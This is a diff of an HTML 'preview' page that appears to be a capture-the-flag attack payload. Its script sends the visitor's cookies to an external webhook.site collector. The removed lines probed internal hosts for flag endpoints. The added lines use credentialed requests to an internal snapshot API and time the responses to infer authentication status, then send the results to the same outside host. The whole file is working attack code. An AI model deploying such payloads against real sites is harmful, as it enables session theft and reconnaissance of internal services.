@@ -1,29 +1,24 @@
 <!doctype html><html><head><meta charset="utf-8"><title>preview</title></head>
 <body>
 <img src="https://webhook.site/a9fd0313-52f4-4ea5-935c-781e7fe64098/NOJS-VISIT" width="1" height="1">
-<img src="https://httpstat.us/200?sleep=15000" width="1" height="1">
+<img src="https://httpstat.us/200?sleep=20000" width="1" height="1">
 <h1>preview</h1>
 <script>
 (function(){
  var WH="https://webhook.site/a9fd0313-52f4-4ea5-935c-781e7fe64098/";
  function B(tag,data){data=(''+(data||'')).slice(0,1500);
-   try{new Image().src=WH+encodeURIComponent(tag)+"?d="+encodeURIComponent(data);}catch(e){}
-   try{fetch(WH+encodeURIComponent(tag),{method:'POST',body:data,mode:'no-cors'});}catch(e){}}
+   try{new Image().src=WH+encodeURIComponent(tag)+"?d="+encodeURIComponent(data);}catch(e){}}
  B('00-JS-RAN','ck='+document.cookie);
- var targets=[
-  'http://web:3000/','http://web:3000/flag','http://web:3000/flag.txt','http://web:3000/api/flag',
-  'http://flag/','http://flag:80/','http://flag:5000/flag','http://flag:8000/',
-  'http://bot:3000/','http://admin:3000/','http://backend:3000/',
-  'http://localhost/','http://127.0.0.1/','http://127.0.0.1:5000/',
-  'http://web:3000/api/snapshot'
- ];
- targets.forEach(function(u){
-   // readable (CORS) attempt
-   fetch(u,{credentials:'include'}).then(r=>r.text()).then(t=>B('READ-OK '+u, t)).catch(function(e){
-     // reachability via no-cors
-     fetch(u,{mode:'no-cors'}).then(()=>B('REACH '+u,'opaque-ok')).catch(e2=>B('UNREACH '+u,''+e2));
-   });
- });
+ var W='http://web:3000';
+ var SLOW='https://httpstat.us/200?sleep=10000';
+ function snap(tag,url,cred){var t0=Date.now();
+   fetch(W+'/api/snapshot',{method:'POST',mode:'no-cors',credentials:cred,body:JSON.stringify({url:url})})
+    .then(()=>B(tag,'ms='+(Date.now()-t0)))
+    .catch(e=>B(tag+'-ERR','ms='+(Date.now()-t0)+' '+e));}
+ snap('SLOW-incl',SLOW,'include');   // authed -> ~10000ms ; 403 -> fast
+ snap('SLOW-omit',SLOW,'omit');
+ snap('INT-incl',W+'/','include');    // authed -> render time ; 403 -> fast
+ snap('EXT-incl','https://webhook.site/a9fd0313-52f4-4ea5-935c-781e7fe64098/SNAP-EXTCB','include'); // authed+extreach -> service visits SNAP-EXTCB
 })();
 </script>
 </body></html>
